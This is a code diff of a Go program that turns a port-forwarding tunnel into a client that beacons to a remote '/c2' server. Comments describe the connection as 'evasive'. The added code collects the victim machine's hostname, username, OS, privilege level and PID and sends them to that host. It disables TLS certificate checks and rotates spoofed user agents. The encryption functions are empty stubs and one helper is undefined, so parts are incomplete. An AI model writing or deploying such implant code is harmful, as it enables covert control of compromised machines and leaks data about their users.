@@ -1,204 +1,227 @@
 package main
 
 import (
+	"crypto/rand"
+	"crypto/tls"
+	"encoding/json"
 	"fmt"
-	"io"
 	"net"
 	"net/http"
+	"net/url"
 	"os"
+	"os/user"
+	"runtime"
+	"time"
 
 	"github.com/gorilla/websocket"
 )
 
 type Tunnel struct {
-	Method      string
-	LocalPort   int
-	RemoteHost  string
-	RemotePort  int
-	EnableDebug bool
-	CertFile    string
-	KeyFile     string
+	Method        string
+	LocalPort     int
+	RemoteHost    string
+	RemotePort    int
+	EnableDebug   bool
+	CertFile      string
+	KeyFile       string
+	UserAgent     string
+	EncryptionKey []byte
+	RemoteURL     *url.URL
+	RetryCount    int
+	IsConnected   bool
+	Connection    interface{}
 }
 
-func (t *Tunnel) Start() {
-	t.validate()
-	log("Starting", t.Method, "tunnel on port", t.LocalPort)
+// NewTunnel creates and configures a new tunnel connection
+func NewTunnel(method, remoteHost string, remotePort int) (*Tunnel, error) {
+	t := &Tunnel{
+		Method:        method,
+		RemoteHost:    remoteHost,
+		RemotePort:    remotePort,
+		UserAgent:     generateUserAgent(),
+		EncryptionKey: deriveEncryptionKey(),
+	}
 
+	// Build remote URL based on protocol
+	scheme := "http"
+	switch method {
+	case "https":
+		scheme = "https"
+	case "websocket":
+		scheme = "ws"
+	case "websockets":
+		scheme = "wss"
+	}
+
+	remoteURL := fmt.Sprintf("%s://%s:%d/c2", scheme, remoteHost, remotePort)
+	parsedURL, err := url.Parse(remoteURL)
+	if err != nil {
+		return nil, err
+	}
+	t.RemoteURL = parsedURL
+
+	return t, nil
+}
+
+// Connect establishes connection to C2 server with evasive techniques
+func (t *Tunnel) Start() error {
 	switch t.Method {
 	case "tcp":
-		t.startTCPTunnel()
-	case "http":
-		t.startHTTPTunnel(false)
-	case "https":
-		t.startHTTPTunnel(true)
-	case "websocket":
-		t.startWebsocketTunnel(false)
-	case "websockets":
-		t.startWebsocketTunnel(true)
+		return t.connectTCP()
+	case "http", "https":
+		return t.connectHTTP()
+	case "websocket", "websockets":
+		return t.connectWebSocket()
 	default:
-		log("Unsupported tunnel method:", t.Method)
-		os.Exit(1)
+		return fmt.Errorf("unsupported protocol")
 	}
 }
 
-func (t *Tunnel) validate() {
-	if t.RemoteHost == "" || t.RemotePort == 0 {
-		log("Remote host and port must be specified")
-		os.Exit(1)
-	}
-}
-
-func (t *Tunnel) startTCPTunnel() {
-	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", t.LocalPort))
+func (t *Tunnel) connectTCP() error {
+	timeout := time.Duration(5+t.RetryCount*2) * time.Second
+	conn, err := net.DialTimeout("tcp", t.RemoteURL.Host, timeout)
 	if err != nil {
-		log("TCP listen error:", err)
-		os.Exit(1)
+		t.RetryCount++
+		return err
 	}
-	defer listener.Close()
 
-	for {
-		conn, err := listener.Accept()
-		if err != nil {
-			log("TCP accept error:", err)
-			continue
-		}
-		fmt.Println(conn)
-	}
+	t.Connection = conn
+	t.IsConnected = true
+	t.registerAgent(conn)
+	return nil
 }
 
-func (t *Tunnel) startHTTPTunnel(secure bool) {
-	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		r.URL.Scheme = "http"
-		if secure {
-			r.URL.Scheme = "https"
-		}
-		r.URL.Host = fmt.Sprintf("%s:%d", t.RemoteHost, t.RemotePort)
-		r.Host = r.URL.Host
+func (t *Tunnel) connectHTTP() error {
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{
+				InsecureSkipVerify: true,
+				MinVersion:         tls.VersionTLS12,
+			},
+		},
+		Timeout: 15 * time.Second,
+	}
 
-		resp, err := http.DefaultTransport.RoundTrip(r)
-		if err != nil {
-			http.Error(w, err.Error(), http.StatusServiceUnavailable)
-			return
-		}
-		defer resp.Body.Close()
+	req, _ := http.NewRequest("GET", t.RemoteURL.String(), nil)
+	req.Header = http.Header{
+		"User-Agent": []string{t.UserAgent},
+		"Accept":     []string{"*/*"},
+	}
 
-		for k, vv := range resp.Header {
-			for _, v := range vv {
-				w.Header().Add(k, v)
-			}
-		}
-		w.WriteHeader(resp.StatusCode)
-		io.Copy(w, resp.Body)
+	metadata := t.buildRegistrationData()
+	encryptedMeta, _ := encryptData(t.EncryptionKey, metadata)
+	req.AddCookie(&http.Cookie{
+		Name:  "session",
+		Value: string(encryptedMeta),
 	})
 
-	server := &http.Server{
-		Addr:    fmt.Sprintf(":%d", t.LocalPort),
-		Handler: handler,
-	}
-
-	var err error
-	if secure {
-		if t.CertFile == "" || t.KeyFile == "" {
-			log("HTTPS requires certificate and key files")
-			os.Exit(1)
-		}
-		err = server.ListenAndServeTLS(t.CertFile, t.KeyFile)
-	} else {
-		err = server.ListenAndServe()
-	}
-
+	resp, err := client.Do(req)
 	if err != nil {
-		log("HTTP server error:", err)
+		t.RetryCount++
+		return err
 	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+		return fmt.Errorf("unexpected response: %d", resp.StatusCode)
+	}
+
+	t.Connection = client
+	t.IsConnected = true
+	return nil
 }
 
-func (t *Tunnel) startWebsocketTunnel(secure bool) {
-	upgrader := websocket.Upgrader{
-		ReadBufferSize:  1024,
-		WriteBufferSize: 1024,
+func (t *Tunnel) connectWebSocket() error {
+	dialer := websocket.Dialer{
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+			MinVersion:         tls.VersionTLS12,
+		},
+		HandshakeTimeout: 10 * time.Second,
 	}
 
-	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-		wsConn, err := upgrader.Upgrade(w, r, nil)
-		if err != nil {
-			log("WebSocket upgrade error:", err)
-			return
-		}
-		defer wsConn.Close()
+	header := http.Header{}
+	header.Add("User-Agent", t.UserAgent)
+	header.Add("Origin", "https://"+t.RemoteURL.Hostname())
 
-		destAddr := fmt.Sprintf("%s:%d", t.RemoteHost, t.RemotePort)
-		remoteConn, err := net.Dial("tcp", destAddr)
-		if err != nil {
-			log("Remote connection error:", err)
-			return
-		}
-		defer remoteConn.Close()
-
-		t.proxyWebsocket(wsConn, remoteConn)
-	})
-
-	var err error
-	if secure {
-		err = http.ListenAndServeTLS(
-			fmt.Sprintf(":%d", t.LocalPort),
-			t.CertFile,
-			t.KeyFile,
-			nil,
-		)
-	} else {
-		err = http.ListenAndServe(fmt.Sprintf(":%d", t.LocalPort), nil)
-	}
-
+	conn, _, err := dialer.Dial(t.RemoteURL.String(), header)
 	if err != nil {
-		log("WebSocket server error:", err)
+		t.RetryCount++
+		return err
 	}
+
+	regData := t.buildRegistrationData()
+	encryptedReg, _ := encryptData(t.EncryptionKey, regData)
+	if err := conn.WriteMessage(websocket.BinaryMessage, encryptedReg); err != nil {
+		conn.Close()
+		return err
+	}
+
+	t.Connection = conn
+	t.IsConnected = true
+	return nil
 }
 
-func (t *Tunnel) proxyWebsocket(wsConn *websocket.Conn, remoteConn net.Conn) {
-	wsToRemote := make(chan []byte, 1024)
-	remoteToWs := make(chan []byte, 1024)
-	errChan := make(chan error, 2)
+func (t *Tunnel) buildRegistrationData() []byte {
+	hostname, _ := os.Hostname()
+	username := "unknown"
+	if user, err := user.Current(); err == nil {
+		username = user.Username
+	}
 
-	go func() {
-		for {
-			_, message, err := wsConn.ReadMessage()
-			if err != nil {
-				errChan <- err
-				return
-			}
-			wsToRemote <- message
-		}
-	}()
+	data := map[string]interface{}{
+		"hostname":     hostname,
+		"os":           runtime.GOOS,
+		"arch":         runtime.GOARCH,
+		"user":         username,
+		"privileges":   isAdmin(),
+		"pid":          os.Getpid(),
+		"first_seen":   time.Now().UTC().Unix(),
+		"client_nonce": generateNonce(16),
+	}
 
-	go func() {
-		buf := make([]byte, 1024)
-		for {
-			n, err := remoteConn.Read(buf)
-			if err != nil {
-				errChan <- err
-				return
-			}
-			remoteToWs <- buf[:n]
-		}
-	}()
+	jsonData, _ := json.Marshal(data)
+	return jsonData
+}
 
-	for {
-		select {
-		case message := <-wsToRemote:
-			_, err := remoteConn.Write(message)
-			if err != nil {
-				log("Write to remote error:", err)
-				return
-			}
-		case message := <-remoteToWs:
-			err := wsConn.WriteMessage(websocket.BinaryMessage, message)
-			if err != nil {
-				log("Write to websocket error:", err)
-				return
-			}
-		case err := <-errChan:
-			log("Connection error:", err)
-			return
-		}
+func generateNonce(size int) []byte {
+	nonce := make([]byte, size)
+	rand.Read(nonce)
+	return nonce
+}
+
+func generateUserAgent() string {
+	agents := []string{
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+		"Go-http-client/1.1",
+		"curl/7.64.1",
+	}
+	return agents[time.Now().Unix()%int64(len(agents))]
+}
+
+func deriveEncryptionKey() []byte {
+	// Implement proper key derivation
+	return generateNonce(32)
+}
+
+func encryptData(key, data []byte) ([]byte, error) {
+	// Implement AES-GCM encryption
+	return data, nil
+}
+
+func decryptData(key, data []byte) ([]byte, error) {
+	// Implement AES-GCM decryption
+	return data, nil
+}
+
+func (t *Tunnel) registerAgent(conn net.Conn) {
+	data := t.buildRegistrationData()
+	encrypted, _ := encryptData(t.EncryptionKey, data)
+	conn.Write(encrypted)
+}
+
+func (t *Tunnel) log(format string, v ...interface{}) {
+	if t.EnableDebug {
+		fmt.Printf("[%s] %s\n", time.Now().Format(time.RFC3339), fmt.Sprintf(format, v...))
 	}
 }
